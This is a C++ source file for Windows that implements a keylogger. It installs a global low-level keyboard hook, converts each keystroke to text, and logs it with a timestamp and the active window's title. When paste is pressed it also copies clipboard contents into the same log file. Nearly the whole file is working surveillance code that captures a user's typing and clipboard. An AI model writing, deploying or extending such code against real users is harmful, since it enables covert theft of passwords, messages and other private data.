#include "pch.h"
#include "KeyLog.h"

BYTE lpKeyState[256];
bool didCopy = false;
CHAR windowTitle[256] = "";
CHAR windowText[300] = "";
SYSTEMTIME curTime;
HWND  hActiveWindow, hPrevWindow;

// Get current timesssss
void checkWindow(char msg)
{
	GetLocalTime(&curTime);

	hActiveWindow = GetForegroundWindow();
	GetWindowTextA(hActiveWindow, windowTitle, 256);
	//Insert reference to the current window


	if ((hActiveWindow != hPrevWindow) && (msg != VK_RETURN)) {

		sprintf_s(windowText, "\n=====================================================================\n%d-%d-%d %d:%d [ %s ]\n=====================================================================\n",
			curTime.wYear, curTime.wMonth,
			curTime.wDay, curTime.wHour, curTime.wMinute, windowTitle);
		Helpers.WritetoFile(FILE_NAME, windowText, strlen(windowText));
		// WriteFile(hFile, windowText, strlen(windowText), &fWritten, 0);
		hPrevWindow = hActiveWindow;
	}

}


LRESULT CALLBACK hk_WndProc(const int code, const WPARAM wParam, const LPARAM lParam) {


	if (wParam == WM_KEYDOWN) {
		KBDLLHOOKSTRUCT* kbdS = (KBDLLHOOKSTRUCT*)lParam;
		DWORD wVirtKey = kbdS->vkCode;
		DWORD wScanCode = kbdS->scanCode;

		RtlZeroMemory(lpKeyState, 256);

		if (!GetKeyboardState(lpKeyState))
		{
			DEBUG_PRINT(("GetKeyboardState %d", GetLastError()));
			PostQuitMessage(0);
		}

		lpKeyState[VK_CONTROL] = 0;

		if (GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0)
		{
			lpKeyState[VK_SHIFT] = 0x80;
		}

		if ((GetKeyState(VK_CAPITAL) & 1) == 1)
		{
			lpKeyState[VK_CAPITAL] = 0x01;
		}

		char result[4];

		RtlZeroMemory(result, 4);
		ToAscii(wVirtKey, wScanCode, lpKeyState, (LPWORD)& result, 0);
		std::string str(result);

		if (GetKeyState(VK_CONTROL) < 0)
		{

			str = "\nCTRL-" + str + "\n";

			if (result[0] == 'v')
				didCopy = true;

		}
		checkWindow(result[0]);
		Helpers.WritetoFile(FILE_NAME, str.c_str(), str.length());
		std::cout << str << std::endl;
	}

	LRESULT lRes = CallNextHookEx(KeyboardHook.hHook, code, wParam, lParam);


	if (didCopy)
	{

		std::string clip = "\n-----------------------------Clipboard:---------------------------\n"
			+ GetClipboardText()
			+ "\n-------------------------------------------------------------------\n";

		Helpers.WritetoFile(FILE_NAME, clip.c_str(), clip.length());
		std::cout << clip << std::endl;

		didCopy = false;
	}
	return lRes;
}


void __fastcall _KeyboardHook::InitKeyboardHook()
{
	KeyboardHook.hHook = SetWindowsHookEx(WH_KEYBOARD_LL, hk_WndProc, NULL, 0);
}


Clipboard::Clipboard()
{
	if (!OpenClipboard(nullptr))
	{
		DEBUG_PRINT(("OpenClipboard %d", GetLastError()));
		PostQuitMessage(0);
	}

}


Clipboard::~Clipboard()
{
	CloseClipboard();
}


TextGlobalLock::~TextGlobalLock()
{
	GlobalUnlock(m_hData);
}


const char* TextGlobalLock::Get() const
{
	return m_psz;
}

// GetClipboardText returns the contents of the clipboard as a string
std::string GetClipboardText()
{
	Clipboard clipboard;

	HANDLE hData = GetClipboardData(CF_TEXT);

	if (hData == nullptr)
		DEBUG_PRINT(("GetClipboardData %d", GetLastError()));

	TextGlobalLock textGlobalLock(hData);
	std::string text(textGlobalLock.Get());

	return text;
}


